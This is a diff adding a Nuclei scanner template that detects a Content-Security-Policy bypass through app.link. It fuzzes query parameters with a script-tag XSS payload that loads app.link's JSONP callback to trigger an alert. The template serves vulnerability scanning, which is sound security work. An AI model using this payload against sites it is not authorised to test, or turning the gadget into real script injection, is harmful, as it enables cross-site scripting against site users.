@@ -1,0 +1,55 @@
+id: app-link-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - App Link
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,app-link
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "app.link"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: app_link_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://app.link/_r?sdk=web&callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "app_link_csp_xss == true"
+# digest: 4a0a00473045022028655fb59a2055052b1b41ae2ed07ef4066366a3328a2993d174e1f034b968e8022100a91c0d2c3f263c7f8a549167fc669569e933616138fe7a4f52cd8d7d1ed33229:922c64590222798bb761d5b6d8e72950
